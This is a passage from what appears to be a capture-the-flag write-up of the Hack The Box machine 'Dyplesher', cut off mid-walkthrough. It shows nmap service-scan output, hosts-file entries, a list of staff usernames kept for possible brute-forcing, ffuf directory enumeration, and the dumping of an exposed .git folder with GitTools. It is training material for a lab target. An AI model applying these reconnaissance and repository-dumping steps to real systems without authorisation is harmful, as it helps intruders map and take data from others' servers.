HTTP/1.0 404 Not Found</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Content-Type: text/html; charset=UTF-8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Set-Cookie: i_like_gogs=5a82cf2da190a2b3; Path=/; HttpOnly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Set-Cookie: _csrf=BNN6xvu0OovfL_MK2WhcVoSl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA%3D%3D; Path=/; Expires=Tue, 22 Sep 2020 20:07:11 GMT; HttpOnly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     Date: Mon, 21 Sep 2020 20:07:11 GMT</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;!DOCTYPE html&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;html&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;head data-suburl=&quot;&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;/&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;author&quot; content=&quot;Gogs&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;description&quot; content=&quot;Gogs is a painless self-hosted Git service&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;keywords&quot; content=&quot;go, git, self-hosted, gogs&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;_csrf&quot; content=&quot;BNN6xvu0OovfL_MK2WhcVoSl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA==&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &lt;meta name=&quot;_suburl&quot; content=&quot;&quot; /&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    &lt;meta</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4369/tcp  open   epmd       Erlang Port Mapper Daemon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| epmd-info:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   epmd_port: 4369</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   nodes:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    rabbit: 25672</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5672/tcp  open   amqp       RabbitMQ 3.7.8 (0-9)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| amqp-info:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   capabilities:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     publisher_confirms: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     exchange_exchange_bindings: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     basic.nack: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     consumer_cancel_notify: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     connection.blocked: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     consumer_priorities: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     authentication_failure_close: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     per_consumer_qos: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     direct_reply_to: YES</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   cluster_name: rabbit@dyplesher</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   information: Licensed under the MPL.  See http://www.rabbitmq.com/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   platform: Erlang/OTP 22.0.7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   product: RabbitMQ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   version: 3.7.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   mechanisms: PLAIN AMQPLAIN</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  locales: en_US</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">11211/tcp open   memcache?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25562/tcp open   unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25565/tcp open   minecraft?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| fingerprint-strings:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     &#x27;{&quot;text&quot;:&quot;Unsupported protocol version&quot;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   NotesRPC:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|     q{&quot;text&quot;:&quot;Unsupported protocol version 0, please use one of these versions:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x&quot;}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25572/tcp closed unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25672/tcp open   unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF-Port3000-TCP:V=7.80%I=7%D=9/21%Time=5F690667%P=x86_64-unknown-linux-gnu</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:%r(GenericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:Bad\x20Request&quot;)%r(GetRequest,2063,&quot;HTTP/1\.0\x20200\x20OK\r\nContent-T</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:ype:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Pa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:th=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=c5223df8b92fb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:1ca;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=xX-05aCyGtiJAIiNzxC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA%3D%3D;\x20Path=/;\x20Expires=Tue,\x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:2022\x20Sep\x202020\x2020:07:06\x20GMT;\x20HttpOnly\r\nDate:\x20Mon,\x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:021\x20Sep\x202020\x2020:07:06\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\n&lt;head\x20data-suburl=\&quot;\&quot;&gt;\n\t&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:0content=\&quot;text/html;\x20charset=UTF-8\&quot;\x20/&gt;\n\t&lt;meta\x20http-equiv=\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=edge\&quot;/&gt;\n\t\n\t\t&lt;meta\x20name=\&quot;au</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:thor\&quot;\x20content=\&quot;Gogs\&quot;\x20/&gt;\n\t\t&lt;meta\x20name=\&quot;description\&quot;\x20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:content=\&quot;Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:&quot;\x20/&gt;\n\t\t&lt;meta\x20name=\&quot;keywords\&quot;\x20content=\&quot;go,\x20git,\x20sel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:f-hosted,\x20gogs\&quot;&gt;\n\t\n\t&lt;meta\x20name=\&quot;referrer\&quot;\x20content=\&quot;no-</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:referrer\&quot;\x20/&gt;\n\t&lt;meta\x20name=\&quot;_csrf\&quot;\x20content=\&quot;xX-05aCyGtiJAI</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:iNzxC_DY6TfAo6MTYwMDcxODgyNjM0MjIxNzkyMA==\&quot;\x20/&gt;\n\t&lt;meta\x20name=\&quot;_</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:suburl\&quot;\x20content=\&quot;\&quot;\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta\x20proper&quot;)%r(Hel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:p,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:&quot;)%r(HTTPOptions,189F,&quot;HTTP/1\.0\x20404\x20Not\x20Found\r\nContent-Type</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF::\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=5a82cf2da190a2b3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=BNN6xvu0OovfL_MK2WhcVo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:Sl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA%3D%3D;\x20Path=/;\x20Expires=Tue,\x202</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:2\x20Sep\x202020\x2020:07:11\x20GMT;\x20HttpOnly\r\nDate:\x20Mon,\x2021</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x20Sep\x202020\x2020:07:11\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html&gt;\n&lt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:head\x20data-suburl=\&quot;\&quot;&gt;\n\t&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20co</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:ntent=\&quot;text/html;\x20charset=UTF-8\&quot;\x20/&gt;\n\t&lt;meta\x20http-equiv=\&quot;X-</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:UA-Compatible\&quot;\x20content=\&quot;IE=edge\&quot;/&gt;\n\t\n\t\t&lt;meta\x20name=\&quot;autho</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:r\&quot;\x20content=\&quot;Gogs\&quot;\x20/&gt;\n\t\t&lt;meta\x20name=\&quot;description\&quot;\x20con</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:tent=\&quot;Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\&quot;\x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:20/&gt;\n\t\t&lt;meta\x20name=\&quot;keywords\&quot;\x20content=\&quot;go,\x20git,\x20self-h</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:osted,\x20gogs\&quot;&gt;\n\t\n\t&lt;meta\x20name=\&quot;referrer\&quot;\x20content=\&quot;no-ref</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:errer\&quot;\x20/&gt;\n\t&lt;meta\x20name=\&quot;_csrf\&quot;\x20content=\&quot;BNN6xvu0OovfL_MK2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:WhcVoSl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA==\&quot;\x20/&gt;\n\t&lt;meta\x20name=\&quot;_sub</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:url\&quot;\x20content=\&quot;\&quot;\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF-Port25565-TCP:V=7.80%I=7%D=9/21%Time=5F69068A%P=x86_64-unknown-linux-gn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:u%r(DNSVersionBindReqTCP,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\&quot;Unsupported\x20protocol\x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:20version\&quot;}&quot;)%r(DNSStatusRequestTCP,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\&quot;Unsupported\x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:20protocol\x20version\&quot;}&quot;)%r(SSLSessionReq,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\&quot;Unsuppo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:rted\x20protocol\x20version\&quot;}&quot;)%r(TLSSessionReq,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\&quot;U</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:nsupported\x20protocol\x20version\&quot;}&quot;)%r(LPDString,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:&quot;Unsupported\x20protocol\x20version\&quot;}&quot;)%r(LDAPSearchReq,2A,&quot;\)\0&#x27;{\&quot;te</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:xt\&quot;:\&quot;Unsupported\x20protocol\x20version\&quot;}&quot;)%r(SIPOptions,2A,&quot;\)\0&#x27;{\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:&quot;text\&quot;:\&quot;Unsupported\x20protocol\x20version\&quot;}&quot;)%r(NotesRPC,74,&quot;s\0q{\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:&quot;text\&quot;:\&quot;Unsupported\x20protocol\x20version\x200,\x20please\x20use\x20</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:one\x20of\x20these\x20versions:\n1\.8\.x,\x201\.9\.x,\x201\.10\.x,\x201</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\.11\.x,\x201\.12\.x\&quot;}&quot;)%r(oracle-tns,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\&quot;Unsupported</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:\x20protocol\x20version\&quot;}&quot;)%r(ms-sql-s,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\&quot;Unsupporte</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:d\x20protocol\x20version\&quot;}&quot;)%r(afp,2A,&quot;\)\0&#x27;{\&quot;text\&quot;:\&quot;Unsupported\x2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SF:0protocol\x20version\&quot;}&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Read data files from: /usr/bin/../share/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap done at Mon Sep 21 22:03:31 2020 -- 1 IP address (1 host up) scanned in 293.75 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-discovery">HTTP discovery<a href="#http-discovery" class="hash-link" aria-label="Direct link to HTTP discovery" title="Direct link to HTTP discovery">​</a></h2><p>Browsing <a href="http://10.10.10.190/" target="_blank" rel="noopener noreferrer">http://10.10.10.190/</a>, we can read <code>Host: test.dyplesher.htb</code>.</p><p>So let&#x27;s add the following entries to <code>/etc/hosts</code>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.190 dyplesher.htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">10.10.10.190 test.dyplesher.htb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There is also a staff page (<a href="http://dyplesher.htb/staff" target="_blank" rel="noopener noreferrer">http://dyplesher.htb/staff</a>) that could help us if
we would need to bruteforce or guess a user account later.</p><p><a href="http://dyplesher.htb/staff" target="_blank" rel="noopener noreferrer">http://dyplesher.htb/staff</a></p><ul><li>MinatoTW, owner</li><li>felamos, dev</li><li>yuntao, admin</li></ul><p>Now if we try to reach the test sub-domain <a href="http://test.dyplesher.htb/" target="_blank" rel="noopener noreferrer">http://test.dyplesher.htb/</a>, there is
a form to store a key/value couple into memcache (port 11211).
Right now we don&#x27;t know if it works so let&#x27;s enumerate a bit.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-enumeration">HTTP enumeration<a href="#http-enumeration" class="hash-link" aria-label="Direct link to HTTP enumeration" title="Direct link to HTTP enumeration">​</a></h2><p>We can perform a sub-folder enumeration with <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">ffuf</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ffuf -u http://test.dyplesher.htb/FUZZ -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -fc 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /&#x27;___\  /&#x27;___\           /&#x27;___\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       /\ \__/ /\ \__/  __  __  /\ \__/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">         \ \_\   \ \_\  \ \____/  \ \_\</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          \/_/    \/_/   \/___/    \/_/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">       v1.2.0-git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Method           : GET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: URL              : http://test.dyplesher.htb/FUZZ</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Follow redirects : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Calibration      : false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Timeout          : 10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Threads          : 40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> :: Filter           : Response status: 403</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">________________________________________________</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.                       [Status: 200, Size: 239, Words: 16, Lines: 15]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">.git                    [Status: 301, Size: 323, Words: 20, Lines: 10]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">:: Progress: [38267/38267] :: Job [1/1] :: 1843 req/sec :: Duration: [0:00:21] :: Errors: 0 ::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There a git folder exposed, so let&#x27;s dump it with <a href="https://github.com/internetwache/GitTools" target="_blank" rel="noopener noreferrer">gittools</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gittools-gitdumper http://test.dyplesher.htb/.git/ repo_dump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">###########</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># GitDumper is part of https://github.com/internetwache/GitTools</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Developed and maintained by @gehaxelt from @internetwache</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Use at your own risk. Usage might be illegal in certain circumstances.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Only for educational purposes!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">###########</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[*] Destination folder does not exist</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Creating repo_dump/.git/</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: objects/info/packs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: description</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: config</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: COMMIT_EDITMSG</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: index</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: packed-refs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: refs/remotes/origin/HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: refs/stash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: logs/HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: logs/refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: info/refs</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: info/exclude</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: /refs/wip/index/refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: /refs/wip/wtree/refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: objects/b1/fe9eddcdf073dc45bb406d47cde1704f222388</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[+] Downloaded: objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Not let&#x27;s see what we have to learn from it:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V 